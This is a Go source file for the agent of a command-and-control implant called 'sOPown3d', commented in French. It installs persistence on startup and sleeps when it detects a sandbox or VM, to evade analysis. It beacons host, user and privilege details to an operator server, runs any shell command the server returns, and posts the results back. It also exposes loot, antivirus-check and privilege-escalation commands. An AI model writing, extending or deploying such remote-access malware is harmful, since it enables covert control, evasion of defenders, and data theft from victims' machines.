package agent

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sOPown3d/internal/agent/evasion"
	"sOPown3d/internal/agent/persistence"
	"strings"
	"time"

	"sOPown3d/internal/agent/jitter"
	"sOPown3d/pkg/shared"
)

type Config struct {
	ServerURL string
	Jitter    shared.JitterConfig
}

type Agent struct {
	serverURL string
	http      *http.Client
	jitter    *jitter.JitterCalculator
	info      shared.AgentInfo
}

func New(cfg Config) (*Agent, error) {
	info := gatherSystemInfo()

	jcalc, err := jitter.NewJitterCalculator(cfg.Jitter)
	if err != nil {
		return nil, fmt.Errorf("init jitter: %w", err)
	}

	persistence.SetupPersistence()

	// Check for sandbox/VM and sleep if detected to bypass analysis
	if isSandbox, details := evasion.IsSandbox(); isSandbox {
		log.Printf("⚠️ SANDBOX DETECTED\n%s", details)
		evasion.LongSleep()
	}

	return &Agent{
		serverURL: cfg.ServerURL,
		http:      &http.Client{Timeout: 10 * time.Second},
		jitter:    jcalc,
		info:      info,
	}, nil
}

func (agent *Agent) Run(ctx context.Context) error {
	log.Printf("=== sOPown3d Agent ===")
	log.Printf("Agent ID: %s", agent.info.Hostname)
	log.Println(agent.jitter.GetStats())
	log.Println("En attente de commandes…")
	log.Println("----------------------------------------")

	i := 0
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		i++
		info := gatherSystemInfo()

		cmd := agent.retrieveCommand(info)
		if cmd != nil && cmd.Action != "" {
			output := executeCommand(cmd)
			if output != "" {
				agent.sendOutput(info.Hostname, output)
			}
		}

		next := agent.jitter.Next()
		log.Printf("[Heartbeat #%d] Next check in: %.2fs", i, next.Seconds())
		time.Sleep(next)
	}
}

// Génère ou récupère l'UUID unique de l'agent
func getOrCreateAgentUUID() string {
	// Chemin du fichier UUID (dans le dossier temp ou AppData)
	var uuidPath string
	if runtime.GOOS == "windows" {
		appData := os.Getenv("APPDATA")
		if appData == "" {
			appData = os.Getenv("TEMP")
		}
		uuidPath = filepath.Join(appData, ".agent_uuid")
	} else {
		uuidPath = filepath.Join(os.TempDir(), ".agent_uuid")
	}

	// Essayer de lire l'UUID existant
	if data, err := os.ReadFile(uuidPath); err == nil {
		uuid := strings.TrimSpace(string(data))
		if len(uuid) == 4 {
			return uuid
		}
	}

	// Générer un nouveau UUID de 4 caractères
	b := make([]byte, 2)
	rand.Read(b)
	uuid := hex.EncodeToString(b) // 4 caractères hex

	// Sauvegarder pour la prochaine fois
	os.WriteFile(uuidPath, []byte(uuid), 0644)

	return uuid
}

// Vérifie si l'agent tourne en admin/root
func isElevated() bool {
	if runtime.GOOS == "windows" {
		// Essayer de créer un fichier dans System32
		testPath := "C:\\Windows\\System32\\test_priv.tmp"
		err := os.WriteFile(testPath, []byte("test"), 0644)
		if err == nil {
			os.Remove(testPath)
			return true
		}
		// Méthode alternative
		cmd := exec.Command("net", "session")
		err = cmd.Run()
		return err == nil
	}
	// Unix: vérifier si UID = 0
	return os.Geteuid() == 0
}

func gatherSystemInfo() shared.AgentInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" && runtime.GOOS != "windows" {
		username = os.Getenv("USER")
	}

	// Générer l'ID unique : hostname-uuid-privilege
	uuid := getOrCreateAgentUUID()
	privilege := "user"
	if isElevated() {
		privilege = "admin"
	}
	agentID := fmt.Sprintf("%s-%s-%s", hostname, uuid, privilege)

	return shared.AgentInfo{
		Hostname: agentID, // Maintenant c'est l'ID complet
		OS:       runtime.GOOS,
		Username: username,
	}
}

func (agent *Agent) retrieveCommand(info shared.AgentInfo) *shared.Command {
	body, err := json.Marshal(info)
	if err != nil {
		log.Printf("marshal agent info error: %v", err)
		return nil
	}

	resp, err := agent.http.Post(agent.serverURL+"/beacon", "application/json", bytes.NewBuffer(body))
	if err != nil {
		log.Printf("beacon error: %v", err)
		return nil
	}
	defer resp.Body.Close()

	var cmd shared.Command
	if err := json.NewDecoder(resp.Body).Decode(&cmd); err != nil || cmd.Action == "" {
		return nil
	}

	return &cmd
}

func executeCommand(cmd *shared.Command) string {
	switch cmd.Action {
	case "shell":
		if cmd.Payload == "" {
			return ""
		}

		log.Printf("Exécute: %s", cmd.Payload)

		var c *exec.Cmd
		if runtime.GOOS == "windows" {
			c = exec.Command("cmd", "/c", cmd.Payload)
		} else {
			c = exec.Command("sh", "-c", cmd.Payload)
		}

		out, err := c.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("Erreur: %v\n%s", err, string(out))
		}

		output := strings.ReplaceAll(string(out), "\n", "\r\n")
		return output

	case "info":
		log.Println("Info: déjà envoyé dans le beacon")
		return ""

	case "ping":
		log.Println("Pong!")
		return ""

	case "persist":
		log.Println("📋 Vérification persistance…")
		if persistent, path := persistence.CheckStartup(); persistent {
			log.Printf("  ✓ Persistant\n  Chemin: %s", path)
		} else {
			log.Println("  ✗ Non persistant")
		}
		return ""

	case "sandbox":
		log.Println("🔍 Checking for sandbox...")
		isSandbox, details := evasion.IsSandbox()
		if isSandbox {
			return "⚠️ SANDBOX DETECTED\n" + details
		}
		return "✅ No sandbox detected\n" + details

	case "loot":
		return executeLootCommand()

	case "checkav":
		return executeCheckAVCommand()

	case "privesc":
		return executePrivescCommand()

	default:
		log.Printf("Commande inconnue: %s", cmd.Action)
		return ""
	}
}

func (agent *Agent) sendOutput(agentID, output string) {
	payload := struct {
		AgentID string `json:"agent_id"`
		Output  string `json:"output"`
	}{
		AgentID: agentID,
		Output:  output,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		log.Printf("marshal output error: %v", err)
		return
	}

	resp, err := agent.http.Post(agent.serverURL+"/ingest", "application/json", bytes.NewBuffer(body))
	if err != nil {
		log.Printf("ingest error: %v", err)
		return
	}
	defer resp.Body.Close()
}
